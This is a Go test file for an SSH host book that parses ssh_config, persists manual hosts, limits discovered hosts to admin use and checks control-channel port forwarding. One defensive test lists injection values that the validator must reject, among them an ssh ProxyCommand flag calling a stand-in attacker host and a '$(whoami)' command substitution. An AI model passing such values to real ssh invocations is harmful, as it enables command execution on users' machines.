package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeFile(t *testing.T, dir, name, body string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestParseSSHConfigSkipsPatternsAndKeepsDetail(t *testing.T) {
	dir := t.TempDir()
	cfg := writeFile(t, dir, "config", `
# a comment
Host code
  HostName 172.16.0.1
  User dev

Host wrt pi
  User root

Host *
  ServerAliveInterval 60

Host !nope
  HostName x

Host github.com-work
  HostName github.com
`)

	got := map[string]hostEntry{}
	for _, e := range parseSSHConfig(cfg) {
		got[e.Alias] = e
	}

	// `*` and `!nope` are matching rules, not machines.
	for _, bad := range []string{"*", "!nope", "nope"} {
		if _, ok := got[bad]; ok {
			t.Errorf("pattern %q was offered as a host", bad)
		}
	}
	// One Host line naming two aliases yields both, sharing the block's settings.
	if got["wrt"].User != "root" || got["pi"].User != "root" {
		t.Errorf("multi-alias Host line lost its User: %+v %+v", got["wrt"], got["pi"])
	}
	if got["code"].HostName != "172.16.0.1" || got["code"].User != "dev" {
		t.Errorf("code entry incomplete: %+v", got["code"])
	}
	if got["github.com-work"].HostName != "github.com" {
		t.Errorf("dotted alias not parsed: %+v", got["github.com-work"])
	}
}

func TestParseSSHConfigFollowsInclude(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "extra", "Host boxfromtheincludefile\n  HostName 10.0.0.9\n")
	main := writeFile(t, dir, "config", "Include extra\nHost code\n")

	var found bool
	for _, e := range parseSSHConfig(main) {
		if e.Alias == "boxfromtheincludefile" && e.HostName == "10.0.0.9" {
			found = true
		}
	}
	if !found {
		t.Fatal("Include was not followed")
	}
}

// An alias ends up as an argv element passed to ssh. argv already rules out a shell, but
// ssh still parses its own flags, so a leading dash must never survive into the book.
func TestAliasCannotLookLikeAnSSHFlag(t *testing.T) {
	dir := t.TempDir()
	cfg := &Config{PublicHosts: []string{"code"}}
	book := newHostBook(cfg, filepath.Join(dir, "none"), filepath.Join(dir, "hosts"))

	for _, bad := range []string{
		"-oProxyCommand=curl evil.example.com",
		"-vvv",
		"a host",
		"a;b",
		"$(whoami)",
		"",
	} {
		if err := book.Add(bad); err == nil {
			t.Errorf("accepted dangerous alias %q", bad)
		}
	}

	if err := book.Add("box2"); err != nil {
		t.Fatalf("rejected a reasonable alias: %v", err)
	}
	if !book.Known("box2") {
		t.Fatal("added host is not known")
	}
}

// Manual hosts are configuration, not runtime state: they must outlive a restart.
func TestManualHostsPersist(t *testing.T) {
	dir := t.TempDir()
	cfg := &Config{PublicHosts: []string{"code"}}
	file := filepath.Join(dir, "hosts")

	first := newHostBook(cfg, filepath.Join(dir, "none"), file)
	if err := first.Add("box2"); err != nil {
		t.Fatal(err)
	}

	reloaded := newHostBook(cfg, filepath.Join(dir, "none"), file)
	if !reloaded.Known("box2") {
		t.Fatal("manual host did not survive a reload")
	}

	if err := reloaded.Remove("box2"); err != nil {
		t.Fatal(err)
	}
	if newHostBook(cfg, filepath.Join(dir, "none"), file).Known("box2") {
		t.Fatal("removed host came back after a reload")
	}
}

func TestOnlyManualHostsCanBeRemoved(t *testing.T) {
	dir := t.TempDir()
	cfg := &Config{PublicHosts: []string{"code"}}
	sshCfg := writeFile(t, dir, "config", "Host discovered\n")
	book := newHostBook(cfg, sshCfg, filepath.Join(dir, "hosts"))

	if err := book.Remove("code"); err == nil {
		t.Error("a public host was removable")
	}
	if err := book.Remove("discovered"); err == nil {
		t.Error("an ssh_config host was removable")
	}
}

// The whole point of the split: discovery must widen what the CONSOLE offers without
// widening what an anonymous caller on a remote VM may ask for.
func TestDiscoveredHostsAreAdminOnly(t *testing.T) {
	dir := t.TempDir()
	sshCfg := writeFile(t, dir, "config", "Host router\n  HostName 192.168.1.1\n")

	m, _ := testManager(t)
	m.book = newHostBook(m.cfg, sshCfg, filepath.Join(dir, "hosts"))
	m.masters["router"] = &fakeMaster{up: true}
	m.setHealthy("router", true)

	admin := &openReq{host: "router", direction: dirLocal, remotePort: 8080, admin: true}
	if err := m.validate(admin); err != nil {
		t.Fatalf("admin path should reach a discovered host, got %v", err)
	}

	public := &openReq{host: "router", direction: dirLocal, remotePort: 8080}
	if err := m.validate(public); err == nil {
		t.Fatal("the public API reached a host that is only in ssh_config")
	}
}

// The control channel is the remote's only route to this daemon. It must be requested
// explicitly, because ssh_config's own RemoteForward silently loses the race whenever
// another connection already holds that remote port.
func TestEnsureControlChannelRequestsTheListenPort(t *testing.T) {
	m, fr := testManager(t)
	m.cfg.Listen = "127.0.0.1:9996"

	m.ensureControlChannel("code")

	var found bool
	for _, argv := range fr.calls {
		joined := strings.Join(argv, " ")
		if strings.Contains(joined, "-R") && strings.Contains(joined, "9996:localhost:9996") {
			found = true
			// It must still go through the ControlPath chokepoint like everything else.
			if !strings.Contains(joined, "-o ControlPath=") {
				t.Errorf("control channel request bypassed ControlPath: %s", joined)
			}
		}
	}
	if !found {
		t.Fatalf("no -R request for the listen port; calls were %v", fr.calls)
	}
}
